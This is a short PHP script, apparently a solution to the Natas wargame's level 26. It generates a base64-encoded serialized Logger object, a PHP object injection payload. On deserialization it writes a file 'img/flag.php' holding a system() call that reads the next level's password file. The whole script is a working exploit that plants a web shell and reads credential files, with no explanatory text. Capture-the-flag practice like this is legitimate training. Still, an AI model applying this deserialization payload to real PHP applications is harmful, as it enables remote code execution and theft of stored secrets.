<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    public function __construct() {
        $this->initMsg = '';
        $this->logFile = 'img/flag.php';
        $this->exitMsg = '<?php echo system("cat /etc/natas_webpass/natas27"); ?>';
    }

    public function check() {
        echo $this->exitMsg . "\n\n";
    }
}

$logger = new Logger();
$serialized = serialize($logger);
echo base64_encode($serialized) . "\n\n\n";
// echo unserialize($formatted) . "\n\n\n";

?>
